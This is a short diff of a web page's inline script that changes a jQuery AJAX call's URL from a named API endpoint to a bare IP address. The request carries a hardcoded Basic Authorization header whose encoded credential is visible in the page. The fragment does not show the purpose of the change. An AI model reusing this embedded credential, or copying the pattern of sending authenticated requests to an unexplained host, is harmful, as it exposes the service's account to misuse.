@@ -8,7 +8,7 @@
 <script type="text/javascript">
     var start = new Date();
     $.ajax({
-        url: "http://pfi.imimobile.net/api/PersonalLink.svc/rest/SendAjaxPersonalLink",
+        url: "http://212.71.238.228/",
         beforeSend: function (request)
         {
             request.setRequestHeader("Authorization", "Basic MTpBRTdBMDdBOC1EMDg1LTQwQzYtQUNFNC1GRjg0RjE0RTMyNDc=");
